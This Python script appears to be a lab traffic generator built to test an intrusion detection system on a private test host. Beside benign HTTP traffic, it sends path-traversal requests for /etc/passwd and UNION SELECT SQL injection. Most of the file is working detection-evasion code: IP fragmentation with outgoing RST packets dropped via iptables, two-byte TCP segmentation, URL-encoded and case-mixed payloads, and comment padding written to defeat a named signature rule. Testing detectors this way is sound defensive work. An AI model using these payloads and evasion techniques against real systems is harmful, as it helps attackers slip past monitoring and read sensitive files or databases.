import sys
import time
import random
import socket
import subprocess
import urllib.parse
import urllib.request
import urllib.error
from scapy.all import IP, TCP, Raw, send, fragment, sr1

TARGET_IP = "192.168.56.20"
TARGET_PORT = 80
MALICIOUS_UA = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

def _http_get(url, user_agent):
    req = urllib.request.Request(url, headers={"User-Agent": user_agent})
    try:
        with urllib.request.urlopen(req, timeout=2) as resp:
            resp.read()
    except urllib.error.HTTPError as e:
        e.read()
    except Exception:
        pass

def generar_benigno(n=300):
    print(f"[*] Generando {n} flujos HTTP benignos...")
    user_agents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
    ]
    rutas = ["/", "/index.html"]
    for _ in range(n):
        url = f"http://{TARGET_IP}{random.choice(rutas)}"
        _http_get(url, random.choice(user_agents))
        time.sleep(random.uniform(0.05, 0.2))
    print("[+] Escenario benigno finalizado.")

def ataque_estandar(n=40):
    print(f"[*] Generando {n} ataques HTTP estándar (sin evasión)...")
    for i in range(n):
        url = f"http://{TARGET_IP}/../../etc/passwd" if i % 2 == 0 else f"http://{TARGET_IP}/?id=1%20UNION%20SELECT%201,2,3"
        _http_get(url, MALICIOUS_UA)
        time.sleep(0.1)
    print("[+] Escenario ataque estándar finalizado.")

def control_ua_benigna(n=40):
    print(f"[*] Control: {n} payloads maliciosos con UA benigna (aísla si la detección depende del UA)...")
    for i in range(n):
        url = f"http://{TARGET_IP}/etc/passwd" if i % 2 == 0 else f"http://{TARGET_IP}/?id=1%20UNION%20SELECT%201,2,3"
        _http_get(url, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        time.sleep(0.1)
    print("[+] Control UA benigna finalizado.")

def evasion_capa3_fragmentacion(n=40):
    print(f"[*] Generando {n} ataques con fragmentación IP en Capa 3 (fragsize=8 + handshake)...")
    payload = (
        f"GET /../../etc/passwd HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"User-Agent: {MALICIOUS_UA}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    regla_rst = ["iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-d", TARGET_IP, "-j", "DROP"]
    limpiar_rst = ["iptables", "-D", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-d", TARGET_IP, "-j", "DROP"]

    subprocess.run(regla_rst, check=False)
    completados = 0
    try:
        for i in range(n):
            sport = random.randint(30000, 60000)
            seq0 = random.randint(1000, 90000)

            syn = IP(dst=TARGET_IP)/TCP(sport=sport, dport=TARGET_PORT, flags="S", seq=seq0)
            synack = sr1(syn, timeout=2, verbose=False)
            if synack is None or not synack.haslayer(TCP) or "S" not in str(synack[TCP].flags):
                continue

            ack_num = synack[TCP].seq + 1
            send(IP(dst=TARGET_IP)/TCP(sport=sport, dport=TARGET_PORT, flags="A", seq=seq0+1, ack=ack_num), verbose=False)

            pkt = IP(dst=TARGET_IP, id=2000+i)/TCP(sport=sport, dport=TARGET_PORT, flags="PA", seq=seq0+1, ack=ack_num)/Raw(load=payload)
            for frag in fragment(pkt, fragsize=8):
                send(frag, verbose=False)

            time.sleep(0.03)
            send(IP(dst=TARGET_IP)/TCP(sport=sport, dport=TARGET_PORT, flags="FA", seq=seq0+1+len(payload), ack=ack_num), verbose=False)
            completados += 1
            time.sleep(0.1)
    finally:
        subprocess.run(limpiar_rst, check=False)
    print(f"[+] Escenario evasión Capa 3 finalizado ({completados}/{n} flujos completados).")

def evasion_capa4_segmentacion(n=40):
    print(f"[*] Generando {n} ataques con micro-segmentación TCP en Capa 4 (chunks de 2 bytes)...")
    payload = (
        f"GET /../../etc/passwd HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"User-Agent: {MALICIOUS_UA}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    completados = 0
    for _ in range(n):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((TARGET_IP, TARGET_PORT))
            for i in range(0, len(payload), 2):
                s.send(payload[i:i+2])
                time.sleep(0.005)
            s.shutdown(socket.SHUT_WR)
            s.recv(1024)
            completados += 1
        except Exception:
            pass
        finally:
            s.close()
        time.sleep(0.1)
    print(f"[+] Escenario evasión Capa 4 finalizado ({completados}/{n} flujos completados).")

def evasion_capa7_ofuscacion(n=40):
    print(f"[*] Generando {n} ataques con ofuscación HTTP en Capa 7...")
    rutas_ofuscadas = [
        "/%2e%2e/%2e%2e/%65%74%63/%70%61%73%73%77%64",
        "/..%2f..%2fetc/passwd",
        "/?id=1/**/uNiOn/**/sElEcT/**/1,2,3"
    ]
    for _ in range(n):
        url = f"http://{TARGET_IP}{random.choice(rutas_ofuscadas)}"
        _http_get(url, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        time.sleep(0.1)
    print("[+] Escenario evasión Capa 7 finalizado.")

def baseline_sqli_contenido(n=40):
    print(f"[*] Baseline SQLi por contenido (sid 2006446), UA benigna, {n} intentos...")
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    for i in range(n):
        url = f"http://{TARGET_IP}/?id=1%20UNION%20SELECT%201,2,3;--"
        _http_get(url, ua)
        time.sleep(0.1)
    print("[+] Baseline SQLi por contenido finalizado.")

def evasion_c7_v2_padding(n=40):
    print(f"[*] Evasión Capa 7 v2: padding SQL para romper 'within:100' (sid 2006446), {n} intentos...")
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    padding = urllib.parse.quote("/**/" * 40)  # ~160 bytes entre UNION y SELECT
    for i in range(n):
        url = f"http://{TARGET_IP}/?id=1%20UNION{padding}SELECT%201,2,3;--"
        _http_get(url, ua)
        time.sleep(0.1)
    print("[+] Evasión Capa 7 v2 (padding) finalizada.")

if __name__ == "__main__":
    modos = {
        "benigno": generar_benigno,
        "estandar": ataque_estandar,
	"control_ua": control_ua_benigna,
        "evasion_c3": evasion_capa3_fragmentacion,
        "evasion_c4": evasion_capa4_segmentacion,
        "evasion_c7": evasion_capa7_ofuscacion,
	"sqli_base": baseline_sqli_contenido,
        "evasion_c7_v2": evasion_c7_v2_padding
    }
    modo = sys.argv[1] if len(sys.argv) > 1 else ""
    if modo in modos:
        modos[modo]()
    else:
        print(f"Uso: sudo ~/tp_sor2/venv/bin/python3 ~/tp_sor2/generador_trafico.py [{'|'.join(modos.keys())}]")
